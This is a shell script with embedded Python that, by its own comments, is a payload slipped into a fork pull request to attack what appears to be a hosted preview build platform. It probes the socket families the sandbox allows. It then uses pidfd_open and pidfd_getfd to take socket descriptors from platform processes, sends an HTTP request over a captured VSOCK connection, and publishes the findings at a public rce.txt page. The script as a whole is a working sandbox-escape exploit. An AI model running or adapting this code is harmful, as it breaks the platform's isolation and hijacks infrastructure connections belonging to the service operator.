#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 9: pidfd_open(1) is allowed by the
# seccomp filter. Take the platform processes' sockets with pidfd_getfd and find
# out what family/peer they have - the build worker's stdout/stderr are SOCKETS.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== socket families, correct types =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import socket
for fam,typ,label in [(17,socket.SOCK_RAW,"AF_PACKET/RAW"),(16,socket.SOCK_DGRAM,"AF_NETLINK/DGRAM"),
                      (40,socket.SOCK_STREAM,"AF_VSOCK/STREAM"),(40,socket.SOCK_DGRAM,"AF_VSOCK/DGRAM"),
                      (2,socket.SOCK_STREAM,"AF_INET/STREAM")]:
    try:
        s=socket.socket(fam,typ); s.close(); print("  %-18s OK"%label)
    except Exception as e:
        print("  %-18s %s"%(label,repr(e)[:60]))
PYEOF
} > "$F" 2>&1
{
  echo "== pidfd_getfd: take the platform sockets =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, ctypes, select
libc = ctypes.CDLL("libc.so.6", use_errno=True)
NAMES = {1:"UNIX", 2:"INET", 10:"INET6", 16:"NETLINK", 17:"PACKET", 40:"VSOCK"}

def call(no, *args):
    return libc.syscall(ctypes.c_long(no), *[ctypes.c_int(a) for a in args])

def name(fd, peer):
    buf = ctypes.create_string_buffer(128); ln = ctypes.c_int(128)
    fn = libc.getpeername if peer else libc.getsockname
    if fn(ctypes.c_int(fd), buf, ctypes.byref(ln)) != 0:
        return None
    fam = ctypes.c_ushort.from_buffer(buf, 0).value
    raw = bytes(buf[:ln.value])
    d = NAMES.get(fam, "fam=%d" % fam)
    if fam == 40:
        d += " cid=%d port=%d" % (int.from_bytes(raw[8:12], "little"),
                                  int.from_bytes(raw[12:16], "little"))
    elif fam in (2, 10):
        d += " %s:%d" % (".".join(str(b) for b in raw[4:8]),
                         int.from_bytes(raw[2:4], "big"))
    elif fam == 1:
        d += " %r" % raw[2:ln.value].split(b"\x00")[0][:60]
    return d

for pid in (1, 12, 36):
    pidfd = call(434, pid, 0)
    if pidfd < 0:
        print("  pidfd_open(%d) -> errno %d" % (pid, ctypes.get_errno())); continue
    print("  pidfd_open(%d) OK -> pidfd %d" % (pid, pidfd))
    for fd in sorted(int(x) for x in os.listdir("/proc/%d/fd" % pid)):
        link = ""
        try: link = os.readlink("/proc/%d/fd/%d" % (pid, fd))
        except Exception: pass
        if "socket" not in link: continue
        got = call(435, pidfd, fd, 0)
        if got < 0:
            print("    pid %d fd %d (%s) -> getfd errno %d" % (pid, fd, link, ctypes.get_errno()))
            continue
        so = name(got, False); pe = name(got, True)
        print("    pid %d fd %d (%s) -> TAKEN as %d | self=%s peer=%s" % (pid, fd, link, got, so, pe))
        if so and "VSOCK" in str(so):
            try:
                os.write(got, b"GET / HTTP/1.1\r\nHost: celld\r\nConnection: close\r\n\r\n")
                r, _, _ = select.select([got], [], [], 1.0)
                data = os.read(got, 300) if r else b"<no reply in 1s>"
                print("      vsock write+read -> %r" % data[:200])
            except Exception as e:
                print("      vsock io -> %r" % e)
PYEOF
} >> "$F" 2>&1
sleep 2
cat "$F"
